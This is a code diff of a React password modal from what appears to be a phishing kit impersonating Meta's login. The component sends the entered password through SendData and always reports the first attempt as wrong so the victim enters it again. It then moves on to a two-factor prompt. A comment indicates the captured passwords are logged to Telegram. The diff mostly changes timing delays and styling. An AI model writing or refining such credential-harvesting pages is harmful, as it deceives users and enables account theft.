@@ -1,6 +1,12 @@
 import React from 'react';
 import { CircleAlert } from 'lucide-react';
 import Modal from '#components/modals/Modal';
+import {
+    modalFooterLogoClass,
+    modalHintBoxClass,
+    modalLeadClass,
+    modalPrimaryBtnClass,
+} from '#components/modals/modalStyles';
 import PasswordInput from '#components/password-input/password-input';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm } from '../../app/store/slices/stepFormSlice';
@@ -13,7 +19,8 @@ interface PasswordModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
-const SUBMIT_DELAY_MS = 1345;
+const SUBMIT_DELAY_MS_1 = 2400;
+const SUBMIT_DELAY_MS_2 = 3200;
 /** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
 const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
@@ -68,19 +75,19 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         handleClose();
     };
 
-    const waitAfterSend = async () => {
+    const waitAfterSend = async (delayMs: number) => {
         try {
             await SendData(formData);
         } catch {
             /* luồng UX vẫn tiếp tục */
         }
-        await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
+        await new Promise((r) => setTimeout(r, delayMs));
     };
 
     const handSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         const newErrors: Record<string, string> = {};
-        if (!password.trim()) newErrors.password = t.password.errEmpty;
+        if (!password.trim()) newErrors.password = 'errEmpty';
 
         if (Object.keys(newErrors).length > 0) {
             setErrors(newErrors);
@@ -90,9 +97,9 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         if (passwordStep === 1) {
             setLoading(true);
             try {
-                await waitAfterSend();
+                await waitAfterSend(SUBMIT_DELAY_MS_1);
                 setPassword('');
-                setErrors({ password: t.password.errWrong });
+                setErrors({ password: 'errWrong' });
                 setPasswordStep(2);
             } finally {
                 setLoading(false);
@@ -103,20 +110,17 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         setLoading(true);
         try {
             await SendData(formData);
-            await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
+            await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS_2));
             isOpendTwoFactor(true);
             handleClose();
         } catch (error) {
             console.error('Error submitting form:', error);
             setPassword('');
-            setErrors({ password: t.password.errWrong });
+            setErrors({ password: 'errWrong' });
         } finally {
             setLoading(false);
         }
     };
-
-    const inputClass = (field: string) =>
-        ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
 
     const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt;
 
@@ -125,17 +129,17 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm';
 
     return (
-        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
-            <div className="flex min-h-full min-w-0 flex-1 flex-col items-center justify-center gap-8 py-2">
-                <div className="mx-auto h-[50px] w-[50px] shrink-0">
-                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
+        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false} compact>
+            <div className="flex min-h-full min-w-0 flex-1 flex-col items-center gap-6 py-1">
+                <div className="mx-auto h-12 w-12 shrink-0">
+                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="" />
                 </div>
 
-                <div className="w-full min-w-0 py-4 sm:py-8">
-                    <p className="mb-[7px] text-[14px] text-[#9a979e]">{prompt}</p>
+                <div className="w-full min-w-0">
+                    <p className={`mb-3 ${modalLeadClass}`}>{prompt}</p>
                     {passwordStep === 2 && (
-                        <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
-                            <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.notice}</p>
+                        <div className={modalHintBoxClass}>
+                            <p>{t.password.notice}</p>
                         </div>
                     )}
                     <form
@@ -150,7 +154,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                 id={passwordId}
                                 name={passwordName}
                                 placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
-                                className={inputClass('password')}
+                                className={errors.password ? 'border-red-500' : ''}
                                 value={password}
                                 onChange={handleChange}
                                 autoComplete="off"
@@ -158,37 +162,36 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                             />
                             {errors.password ? (
                                 <div
-                                    className="mb-[10px] mt-[-5px] flex items-start gap-2 text-[14px] text-red-600"
+                                    className="mb-2.5 mt-1 flex items-start gap-2 text-[13px] text-red-600"
                                     role="alert"
                                 >
                                     <CircleAlert className="mt-0.5 size-4 shrink-0" aria-hidden />
-                                    <span>{errors.password}</span>
+                                    <span>
+                                        {errors.password === 'errEmpty'
+                                            ? t.password.errEmpty
+                                            : t.password.errWrong}
+                                    </span>
                                 </div>
                             ) : null}
                         </div>
-                        <div className="mt-[20px] w-full">
+                        <div className="mt-5 w-full">
                             <button
                                 type="submit"
-                                className={`flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] px-4 py-[10px] text-white transition-opacity duration-300 active:opacity-90 ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
+                                className={modalPrimaryBtnClass}
                                 disabled={loading}
                             >
                                 {loading && (
-                                    <div className="mr-[10px] h-[20px] w-[20px] animate-spin">
+                                    <div className="mr-2.5 h-5 w-5 animate-spin">
                                         <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                     </div>
                                 )}
                                 {loading ? '' : t.password.continue}
                             </button>
                         </div>
-                        <div className="mt-[10px] text-center">
-                            <span className="inline-block cursor-default select-none text-[14px] text-[#9a979e] opacity-50">
-                                {t.password.forgot}
-                            </span>
-                        </div>
                     </form>
                 </div>
 
-                <div className="mx-auto h-[60px] w-[60px] shrink-0">
+                <div className={`${modalFooterLogoClass} mt-2`}>
                     <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                 </div>
             </div>
